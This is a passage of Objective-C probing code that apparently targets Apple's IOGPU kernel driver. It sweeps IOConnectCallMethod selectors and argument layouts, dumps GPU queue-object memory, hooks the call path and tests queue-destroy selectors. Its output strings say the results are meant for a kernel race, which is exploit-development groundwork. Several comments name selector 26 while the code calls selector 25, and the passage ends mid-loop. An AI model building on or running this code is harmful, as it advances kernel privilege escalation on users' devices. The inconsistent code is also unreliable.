    // Sweep stride values: try sel=26 with {qid, 0, count, stride}
    // where struct_size = count * stride
    // Try common GPU command buffer sizes
    uint32_t strides[] = {
        0x1, 0x2, 0x4, 0x8, 0x10, 0x20, 0x40, 0x60, 0x80,
        0x100, 0x200, 0x400, 0x800, 0x1000,
        0x28, 0x48, 0x50, 0x58, 0x70, 0x90, 0xa0, 0xc0,
        0x110, 0x120, 0x150, 0x180, 0x200, 0x300, 0x500
    };
    int nStrides = (int)(sizeof(strides) / sizeof(strides[0]));

    for (int i = 0; i < nStrides; i++) {
        uint32_t stride = strides[i];
        // count=1, struct_size = 1 * stride = stride
        uint64_t sc[4] = {qid, 0, 1, stride};
        void *inS = calloc(1, stride);
        kern_return_t r = pCall(conn, 25, sc, 4, inS, stride, NULL, NULL, NULL, NULL);
        unsigned ur = (unsigned)r;
        if (ur != 0xe00002c2) {
            [out appendFormat:@"stride=0x%x -> 0x%08x%@\n", stride, ur, p010KrName(ur)];
        }
        free(inS);
    }

    // Also try count=0 (empty submit, no struct)
    {
        uint64_t sc[4] = {qid, 0, 0, 0};
        kern_return_t r = pCall(conn, 25, sc, 4, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"count=0 -> 0x%08x%@\n", (unsigned)r, p010KrName((unsigned)r)];
    }

    // Try with different scalar[1] values (flags?)
    for (uint32_t flags = 0; flags <= 4; flags++) {
        uint64_t sc[4] = {qid, flags, 1, 0x40};
        void *inS = calloc(1, 0x40);
        kern_return_t r = pCall(conn, 25, sc, 4, inS, 0x40, NULL, NULL, NULL, NULL);
        unsigned ur = (unsigned)r;
        if (ur != 0xe00002c2) {
            [out appendFormat:@"flags=%u stride=0x40 -> 0x%08x%@\n", flags, ur, p010KrName(ur)];
        }
        free(inS);
    }

    // Dump queue object to find cmdBufArgSize at queue[0xa6]+0x268
    [out appendString:@"\n--- queue object dump (0x200) ---\n"];
    uint8_t *qb = (uint8_t *)queue;
    for (int i = 0; i < 0x200; i += 16) {
        NSMutableString *line = [NSMutableString string];
        [line appendFormat:@"%03x:", i];
        for (int j = 0; j < 16; j++)
            [line appendFormat:@" %02x", qb[i+j]];
        [out appendString:line];
        [out appendString:@"\n"];
    }

    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"Non-BadArg stride = correct cmdBufArgSize. Race with that.\n"];
    return out;
}

+ (NSString *)runP010Qid2Probe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 qid2 probe -- try internal handle as scalar[0]\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pDevGetConn(dev);

    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }

    uint32_t qid1 = pGetID ? pGetID(queue) : 1;
    uint64_t qid2val = *(uint64_t *)((uint8_t *)queue + 0x20);
    uint64_t raw18 = *(uint64_t *)((uint8_t *)queue + 0x18);
    [out appendFormat:@"conn=%u qid1=%u raw+0x18=0x%llx raw+0x20=0x%llx\n\n", conn, qid1, raw18, qid2val];

    // Dump 0x600 of queue object
    [out appendString:@"--- queue dump (0x600) ---\n"];
    uint8_t *qb = (uint8_t *)queue;
    for (int i = 0; i < 0x600; i += 16) {
        NSMutableString *line = [NSMutableString string];
        [line appendFormat:@"%03x:", i];
        for (int j = 0; j < 16; j++)
            [line appendFormat:@" %02x", qb[i+j]];
        [out appendString:line];
        [out appendString:@"\n"];
    }

    // Try sel=26 with qid2val as scalar[0]
    uint32_t strides[] = {0x1, 0x8, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400};
    for (int i = 0; i < 9; i++) {
        uint32_t stride = strides[i];
        uint64_t sc[4] = {qid2val, 0, 1, stride};
        void *inS = calloc(1, stride);
        kern_return_t r = pCall(conn, 25, sc, 4, inS, stride, NULL, NULL, NULL, NULL);
        unsigned ur = (unsigned)r;
        if (ur != 0xe00002c2)
            [out appendFormat:@"qid2val stride=0x%x -> 0x%08x%@\n", stride, ur, p010KrName(ur)];
        free(inS);
    }

    // Try sel=26 with raw+0x18 as scalar[0]
    for (int i = 0; i < 9; i++) {
        uint32_t stride = strides[i];
        uint64_t sc[4] = {raw18, 0, 1, stride};
        void *inS = calloc(1, stride);
        kern_return_t r = pCall(conn, 25, sc, 4, inS, stride, NULL, NULL, NULL, NULL);
        unsigned ur = (unsigned)r;
        if (ur != 0xe00002c2)
            [out appendFormat:@"raw18 stride=0x%x -> 0x%08x%@\n", stride, ur, p010KrName(ur)];
        free(inS);
    }

    // Try with scalar[1] = qid2val (maybe it's {qid1, qid2val, count, stride})
    for (int i = 0; i < 9; i++) {
        uint32_t stride = strides[i];
        uint64_t sc[4] = {qid1, qid2val, 1, stride};
        void *inS = calloc(1, stride);
        kern_return_t r = pCall(conn, 25, sc, 4, inS, stride, NULL, NULL, NULL, NULL);
        unsigned ur = (unsigned)r;
        if (ur != 0xe00002c2)
            [out appendFormat:@"{qid1,qid2val,1,stride=0x%x} -> 0x%08x%@\n", stride, ur, p010KrName(ur)];
        free(inS);
    }

    // Try with scalar[1] = qid1, scalar[0] = qid2val
    for (int i = 0; i < 4; i++) {
        uint32_t stride = strides[i];
        uint64_t sc[4] = {qid2val, qid1, 1, stride};
        void *inS = calloc(1, stride);
        kern_return_t r = pCall(conn, 25, sc, 4, inS, stride, NULL, NULL, NULL, NULL);
        unsigned ur = (unsigned)r;
        if (ur != 0xe00002c2)
            [out appendFormat:@"{qid2val,qid1,1,stride=0x%x} -> 0x%08x%@\n", stride, ur, p010KrName(ur)];
        free(inS);
    }

    [out appendString:@"\n(all BadArg = not shown)\n"];

    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"Non-BadArg = found correct scalar layout. Race that.\n"];
    return out;
}

// Hook IOConnectCallMethod to intercept Metal's sel=26 call
static IOConnectCallMethod_t gOrigCall = NULL;
static NSMutableString *gHookLog = nil;
static int gHookCount = 0;

static kern_return_t myCallMethod(mach_port_t conn, uint32_t sel,
    const uint64_t *in, uint32_t inCnt,
    const void *inS, size_t inSz,
    uint64_t *out, uint32_t *outCnt,
    void *outS, size_t *outSz) {
    if (gHookLog && sel == 26 && gHookCount < 5) {
        gHookCount++;
        [gHookLog appendFormat:@"sel=%u conn=%u inSc=%u stSz=%zu\n", sel, conn, inCnt, inSz];
        if (in && inCnt > 0) {
            [gHookLog appendString:@"  scalars:"];
            for (uint32_t i = 0; i < inCnt && i < 8; i++)
                [gHookLog appendFormat:@" 0x%llx", in[i]];
            [gHookLog appendString:@"\n"];
        }
        if (inS && inSz > 0 && inSz <= 0x200) {
            [gHookLog appendString:@"  struct:"];
            const uint8_t *b = (const uint8_t *)inS;
            for (size_t i = 0; i < inSz && i < 0x80; i++)
                [gHookLog appendFormat:@" %02x", b[i]];
            [gHookLog appendString:@"\n"];
        }
    }
    return gOrigCall(conn, sel, in, inCnt, inS, inSz, out, outCnt, outS, outSz);
}

+ (NSString *)runP010HookSubmit {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 hook submit -- intercept Metal's sel=26 call\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    gOrigCall = (IOConnectCallMethod_t)dlsym(iokit, "IOConnectCallMethod");
    if (!gOrigCall) { [out appendString:@"STOP no IOConnectCallMethod\n"]; return out; }

    // Use rebind_symbols (fishhook) to hook IOConnectCallMethod
    // Since we can't easily import fishhook, use dyld_interpose via rebind_symbols
    // Actually, simpler: just call Metal and manually intercept by
    // reading the queue object fields that Submit uses

    // From the 23F77 Submit disasm: it reads queue+0x530 (kernel queue ptr)
    // and queue+0x18 (qid1) to build the scalars.
    // Let's dump the key fields from the queue object.

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pDevGetConn(dev);

    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }

    uint32_t qid1 = pGetID ? pGetID(queue) : 1;
    [out appendFormat:@"dev conn=%u qid1=%u queue=%p\n", conn, qid1, queue];

    // Get the QUEUE's connection (different from device's connection!)
    // sel=26 (submit_command_buffers) is likely on the queue's user client
    typedef uint32_t (*QGetConn_t)(void *);
    QGetConn_t pQGetConn = (QGetConn_t)dlsym(iogpu, "IOGPUCommandQueueGetConnect");
    io_connect_t qconn = pQGetConn ? pQGetConn(queue) : 0;
    [out appendFormat:@"queue conn=%u (via IOGPUCommandQueueGetConnect=%p)\n", qconn, pQGetConn];

    // Read key fields from queue object that Submit uses
    uint8_t *qb = (uint8_t *)queue;
    [out appendString:@"\n--- key queue fields ---\n"];
    for (int off = 0; off <= 0x600; off += 8) {
        uint64_t val = *(uint64_t *)(qb + off);
        if (val == 0) continue;
        [out appendFormat:@"+0x%03x: 0x%016llx\n", off, (unsigned long long)val];
    }

    // Sweep selectors on BOTH connections to find which ones are valid
    // Try multiple scalar/struct combos per selector (not just sc=4/ss=0x40)
    [out appendString:@"\n--- selector sweep (dev conn) ---\n"];
    // Combos: {sc, ss} — try minimal and common layouts
    const int nCombos = 5;
    uint32_t combos_sc[nCombos] = {0, 1, 2, 4, 0};
    uint32_t combos_ss[nCombos] = {0, 0, 0, 0x40, 0x40};
    for (uint32_t sel = 0; sel <= 40; sel++) {
        for (int c = 0; c < nCombos; c++) {
            uint32_t sc = combos_sc[c];
            uint32_t ss = combos_ss[c];
            uint64_t sbuf[4] = {qid1, 0, 1, ss};
            void *db = ss ? calloc(1, ss) : NULL;
            uint32_t osc = 0; size_t oss = 0;
            kern_return_t r = gOrigCall(conn, sel, sbuf, sc, db, ss, NULL, &osc, NULL, &oss);
            if (r != 0xe00002c2) {
                [out appendFormat:@"sel=%u sc=%u ss=0x%x: rc=0x%08x ***\n", sel, sc, ss, (unsigned)r];
            }
            free(db);
        }
    }
    if (qconn && qconn != conn) {
        [out appendString:@"\n--- selector sweep (queue conn) ---\n"];
        for (uint32_t sel = 0; sel <= 40; sel++) {
            for (int c = 0; c < nCombos; c++) {
                uint32_t sc = combos_sc[c];
                uint32_t ss = combos_ss[c];
                uint64_t sbuf[4] = {qid1, 0, 1, ss};
                void *db = ss ? calloc(1, ss) : NULL;
                uint32_t osc = 0; size_t oss = 0;
                kern_return_t r = gOrigCall(qconn, sel, sbuf, sc, db, ss, NULL, &osc, NULL, &oss);
                if (r != 0xe00002c2) {
                    [out appendFormat:@"sel=%u sc=%u ss=0x%x: rc=0x%08x ***\n", sel, sc, ss, (unsigned)r];
                }
                free(db);
            }
        }
    }

    // We already have our own IOGPU queue (queue, qid1, conn).
    // Instead of scanning Metal's wrapper ivars (which crashes on raw pointers),
    // just call sel=26 directly on our own conn with a test struct.
    // From RE: sel=26 takes 4 scalars {qid, 0, 1, stride} + struct (stride bytes).
    // Try a zeroed struct of stride=0x40 and see if it returns success.

    // Create Metal device + queue just to have a buffer for context
    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
    id<MTLCommandQueue> mq = [mtl newCommandQueue];
    id<MTLBuffer> buf = [mtl newBufferWithLength:4096 options:MTLResourceStorageModeShared];

    // Try sel=26 on BOTH device conn and queue conn
    uint32_t stride = 0x40;
    void *structData = calloc(1, stride);
    const uint64_t scalars[4] = { qid1, 0, 1, stride };
    uint32_t outScalars[16] = {0};
    uint32_t outScalarCount = 0;
    size_t outStructSize = 0;
    kern_return_t rc26 = gOrigCall(conn, 26,
        scalars, 4,
        structData, stride,
        outScalars, &outScalarCount,
        NULL, &outStructSize);
    [out appendFormat:@"\nsel=26 on dev conn: rc=0x%x qid=%u stride=0x%x\n",
        rc26, qid1, stride];
    if (qconn) {
        outScalarCount = 0; outStructSize = 0;
        kern_return_t rc26q = gOrigCall(qconn, 26,
            scalars, 4, structData, stride,
            outScalars, &outScalarCount, NULL, &outStructSize);
        [out appendFormat:@"sel=26 on queue conn: rc=0x%x qid=%u stride=0x%x\n",
            rc26q, qid1, stride];
    }

    // 0xe00002c2 = BadArgument from dispatch table check.
    // Sweep scalar COUNT (0-8) and struct SIZE on BOTH connections
    [out appendString:@"\n--- sel=26 sweep (dev conn) ---\n"];
    int foundLayout = -1;
    for (uint32_t sc = 0; sc <= 8; sc++) {
        for (uint32_t ss = 0; ss <= 0x200; ss = (ss == 0) ? 0x10 : ss + 0x10) {
            uint64_t sbuf[8] = {qid1, 0, 1, ss, 0, 0, 0, 0};
            void *dbuf = ss ? calloc(1, ss) : NULL;
            uint32_t osc = 0; size_t oss = 0;
            kern_return_t r = gOrigCall(conn, 26,
                sbuf, sc, dbuf, ss, NULL, &osc, NULL, &oss);
            if (r != 0xe00002c2) {
                [out appendFormat:@"sc=%u ss=0x%x: rc=0x%08x ***\n", sc, ss, (unsigned)r];
                if (r == 0) { foundLayout = sc; break; }
            }
            free(dbuf);
        }
        if (foundLayout >= 0) break;
    }
    if (qconn) {
        [out appendString:@"\n--- sel=26 sweep (queue conn) ---\n"];
        for (uint32_t sc = 0; sc <= 8; sc++) {
            for (uint32_t ss = 0; ss <= 0x200; ss = (ss == 0) ? 0x10 : ss + 0x10) {
                uint64_t sbuf[8] = {qid1, 0, 1, ss, 0, 0, 0, 0};
                void *dbuf = ss ? calloc(1, ss) : NULL;
                uint32_t osc = 0; size_t oss = 0;
                kern_return_t r = gOrigCall(qconn, 26,
                    sbuf, sc, dbuf, ss, NULL, &osc, NULL, &oss);
                if (r != 0xe00002c2) {
                    [out appendFormat:@"sc=%u ss=0x%x: rc=0x%08x ***\n", sc, ss, (unsigned)r];
                    if (r == 0) { foundLayout = sc; break; }
                }
                free(dbuf);
            }
            if (foundLayout >= 0) break;
        }
    }
    if (foundLayout >= 0) {
        [out appendFormat:@"*** SUCCESS: scalarCount=%d ***\n", foundLayout];
    } else {
        [out appendString:@"All combos returned BadArgument\n"];
    }

    free(structData);

    // Now commit a real Metal command buffer to see if Metal's sel=26 works
    [out appendString:@"\n--- Metal commit test ---\n"];
    @autoreleasepool {
        id<MTLCommandBuffer> cb = [mq commandBuffer];
        id<MTLBlitCommandEncoder> blit = [cb blitCommandEncoder];
        [blit fillBuffer:buf range:NSMakeRange(0, 4) value:1];
        [blit endEncoding];
        [cb commit];
        [cb waitUntilCompleted];
        [out appendFormat:@"Metal blit status=%ld\n", (long)[cb status]];
    }

    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"Compare fw queue vs Metal queue fields to find the ID Submit uses.\n"];
    return out;
}

+ (NSString *)runP010MetalSel26 {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 Metal sel=26 -- call sel=26 on Metal's own conn\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    if (!pCall) { [out appendString:@"STOP no IOConnectCallMethod\n"]; return out; }

    // Create Metal device + queue (fully initialized kernel queue)
    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
    id<MTLCommandQueue> mq = [mtl newCommandQueue];
    id<MTLBuffer> buf = [mtl newBufferWithLength:4096 options:MTLResourceStorageModeShared];

    // Find Metal's internal IOGPUCommandQueue
    void *mtlQ = NULL;
    Class cls = object_getClass(mq);
    while (cls) {
        unsigned int n = 0;
        Ivar *ivars = class_copyIvarList(cls, &n);
        for (unsigned int i = 0; i < n; i++) {
            const char *nm = ivar_getName(ivars[i]);
            if (nm && strcmp(nm, "_commandQueue") == 0) {
                mtlQ = *(void **)((char *)(__bridge void *)mq + ivar_getOffset(ivars[i]));
            }
        }
        free(ivars);
        cls = class_getSuperclass(cls);
    }
    if (!mtlQ) { [out appendString:@"STOP no mtlQ\n"]; return out; }

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef uint32_t (*GetID_t)(void *);
    typedef uint32_t (*GetConn_t)(void *);
    GetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");
    GetConn_t pGetConn = dlsym(iogpu, "IOGPUCommandQueueGetConnect");

    uint32_t qid = pGetID ? pGetID(mtlQ) : 0;
    io_connect_t conn = pGetConn ? pGetConn(mtlQ) : 0;
    [out appendFormat:@"Metal queue=%p qid=%u conn=%u\n", mtlQ, qid, conn];
    if (!conn) { [out appendString:@"STOP no conn\n"]; return out; }

    // Commit one blit to ensure kernel queue is fully set up
    @autoreleasepool {
        id<MTLCommandBuffer> cb = [mq commandBuffer];
        id<MTLBlitCommandEncoder> blit = [cb blitCommandEncoder];
        [blit fillBuffer:buf range:NSMakeRange(0, 4) value:1];
        [blit endEncoding];
        [cb commit];
        [cb waitUntilCompleted];
        [out appendFormat:@"warmup blit status=%ld\n", (long)[cb status]];
    }

    // Now call sel=26 on Metal's conn with Metal's qid
    // From 23F77 RE: sel=26 takes 4 scalars, no output
    // scalar[0] = qid (queue id)
    // scalar[1..3] = unknown (stride, count, flags?)
    // Sweep scalar[0] = qid, scalar[1] = stride values
    uint64_t inS[8];
    uint64_t outS[16];
    uint32_t outCnt;

    [out appendString:@"\n--- sel=26 scalar[0]=qid sweep ---\n"];
    // Try qid as scalar[0], 0 for others
    memset(inS, 0, sizeof(inS));
    inS[0] = qid;
    outCnt = 16;
    kern_return_t rc = pCall(conn, 25, inS, 4, NULL, 0, outS, &outCnt, NULL, 0);
    [out appendFormat:@"sel=26 s0=qid(%u) s1=0 s2=0 s3=0 -> 0x%x\n", qid, rc];

    // Try qid as scalar[0], various strides as scalar[1]
    int strides[] = {0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000, 0x4000};
    for (int i = 0; i < 10; i++) {
        memset(inS, 0, sizeof(inS));
        inS[0] = qid;
        inS[1] = strides[i];
        outCnt = 16;
        rc = pCall(conn, 25, inS, 4, NULL, 0, outS, &outCnt, NULL, 0);
        [out appendFormat:@"sel=26 s0=qid s1=0x%x -> 0x%x\n", strides[i], rc];
        if (rc != 0xe00002c2) [out appendFormat:@"  *** NON-BADARG ***\n"];
    }

    // Try with a small struct (maybe sel=26 needs a struct too)
    [out appendString:@"\n--- sel=26 with struct (s0=qid) ---\n"];
    uint8_t inStruct[0x100];
    memset(inStruct, 0, sizeof(inStruct));
    memset(inS, 0, sizeof(inS));
    inS[0] = qid;
    outCnt = 16;
    rc = pCall(conn, 25, inS, 4, inStruct, 0x100, outS, &outCnt, NULL, 0);
    [out appendFormat:@"sel=26 s0=qid struct=0x100 -> 0x%x\n", rc];
    if (rc != 0xe00002c2) [out appendFormat:@"  *** NON-BADARG ***\n"];

    // Maybe sel=26 takes different scalar counts
    [out appendString:@"\n--- sel=26 scalar count sweep (s0=qid) ---\n"];
    for (int n = 1; n <= 8; n++) {
        memset(inS, 0, sizeof(inS));
        inS[0] = qid;
        outCnt = 16;
        rc = pCall(conn, 25, inS, n, NULL, 0, outS, &outCnt, NULL, 0);
        [out appendFormat:@"sel=26 nScalar=%d s0=qid -> 0x%x\n", n, rc];
        if (rc != 0xe00002c2) [out appendFormat:@"  *** NON-BADARG ***\n"];
    }

    // Also sweep ALL selectors on Metal's conn to find which ones work
    [out appendString:@"\n--- full selector sweep on Metal conn ---\n"];
    int nonBad = 0;
    for (int sel = 0; sel <= 40; sel++) {
        memset(inS, 0, sizeof(inS));
        inS[0] = qid;
        outCnt = 16;
        rc = pCall(conn, sel, inS, 1, NULL, 0, outS, &outCnt, NULL, 0);
        if (rc != 0xe00002c2) {
            [out appendFormat:@"sel=%d -> 0x%x ***\n", sel, rc];
            nonBad++;
        }
    }
    [out appendFormat:@"non-BadArg selectors: %d\n", nonBad];

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010DestroyExact {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 destroy exact -- sel=13 (2 scalar) + sel=8 (1 scalar)\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pDevGetConn(dev);

    // Create queue
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }

    uint32_t qid1 = pGetID ? pGetID(queue) : 1;
    // Read qid2 from queue+0x20
    uint32_t qid2 = *(uint32_t *)((uint8_t *)queue + 0x20);
    [out appendFormat:@"conn=%u qid1=%u qid2=0x%x queue=%p\n", conn, qid1, qid2, queue];

    uint64_t inS[8];
    uint64_t outS[16];
    uint32_t outCnt;
    kern_return_t rc;

    // Baseline: sel=9 with struct (should be NoResources)
    [out appendString:@"\n--- baseline sel=9 ---\n"];
    {
        uint8_t inStruct[128];
        memset(inStruct, 0, sizeof(inStruct));
        memset(inS, 0, sizeof(inS));
        outCnt = 16;
        rc = pCall(conn, 9, inS, 0, inStruct, 128, outS, &outCnt, NULL, 0);
        [out appendFormat:@"sel=9 struct=128 -> 0x%x\n", rc];
    }

    // Test sel=13 with 2 scalars (qid1, qid2)
    [out appendString:@"\n--- sel=13 (2 scalars) ---\n"];
    memset(inS, 0, sizeof(inS));
    inS[0] = qid1;
    inS[1] = qid2;
    outCnt = 16;
    rc = pCall(conn, 13, inS, 2, NULL, 0, outS, &outCnt, NULL, 0);
    [out appendFormat:@"sel=13 s0=qid1(%u) s1=qid2(0x%x) -> 0x%x\n", qid1, qid2, rc];
    if (rc != 0xe00002c2) [out appendFormat:@"  *** NON-BADARG ***\n"];

    // Check if queue still alive: sel=9
    {
        uint8_t inStruct[128];
        memset(inStruct, 0, sizeof(inStruct));
        memset(inS, 0, sizeof(inS));
        outCnt = 16;
        rc = pCall(conn, 9, inS, 0, inStruct, 128, outS, &outCnt, NULL, 0);
        [out appendFormat:@"  post-sel13 sel=9 -> 0x%x\n", rc];
    }

    // Test sel=13 with 2 scalars (qid1, 0)
    memset(inS, 0, sizeof(inS));
    inS[0] = qid1;
    inS[1] = 0;
    outCnt = 16;
    rc = pCall(conn, 13, inS, 2, NULL, 0, outS, &outCnt, NULL, 0);
    [out appendFormat:@"sel=13 s0=qid1 s1=0 -> 0x%x\n", rc];
    if (rc != 0xe00002c2) [out appendFormat:@"  *** NON-BADARG ***\n"];

    // Test sel=13 with 2 scalars (qid2, qid1)
    memset(inS, 0, sizeof(inS));
    inS[0] = qid2;
    inS[1] = qid1;
    outCnt = 16;
    rc = pCall(conn, 13, inS, 2, NULL, 0, outS, &outCnt, NULL, 0);
    [out appendFormat:@"sel=13 s0=qid2 s1=qid1 -> 0x%x\n", rc];
    if (rc != 0xe00002c2) [out appendFormat:@"  *** NON-BADARG ***\n"];

    // Test sel=8 with 1 scalar (qid1)
    [out appendString:@"\n--- sel=8 (1 scalar) ---\n"];
    memset(inS, 0, sizeof(inS));
    inS[0] = qid1;
    outCnt = 16;
    rc = pCall(conn, 8, inS, 1, NULL, 0, outS, &outCnt, NULL, 0);
    [out appendFormat:@"sel=8 s0=qid1(%u) -> 0x%x\n", qid1, rc];
    if (rc != 0xe00002c2) [out appendFormat:@"  *** NON-BADARG ***\n"];

    // Check if queue still alive
    {
        uint8_t inStruct[128];
        memset(inStruct, 0, sizeof(inStruct));
        memset(inS, 0, sizeof(inS));
        outCnt = 16;
        rc = pCall(conn, 9, inS, 0, inStruct, 128, outS, &outCnt, NULL, 0);
        [out appendFormat:@"  post-sel8 sel=9 -> 0x%x\n", rc];
    }

    // Test sel=8 with 1 scalar (qid2)
    memset(inS, 0, sizeof(inS));
    inS[0] = qid2;
    outCnt = 16;
    rc = pCall(conn, 8, inS, 1, NULL, 0, outS, &outCnt, NULL, 0);
    [out appendFormat:@"sel=8 s0=qid2(0x%x) -> 0x%x\n", qid2, rc];
    if (rc != 0xe00002c2) [out appendFormat:@"  *** NON-BADARG ***\n"];

    // Also try sel=13 and sel=8 with various other scalar values
    [out appendString:@"\n--- sel=13/8 scalar value sweep ---\n"];
    uint64_t vals[] = {0, 1, 2, 0x100, 0x200, 0x1000};
    for (int i = 0; i < 6; i++) {
        memset(inS, 0, sizeof(inS));
        inS[0] = vals[i];
        inS[1] = vals[i];
        outCnt = 16;
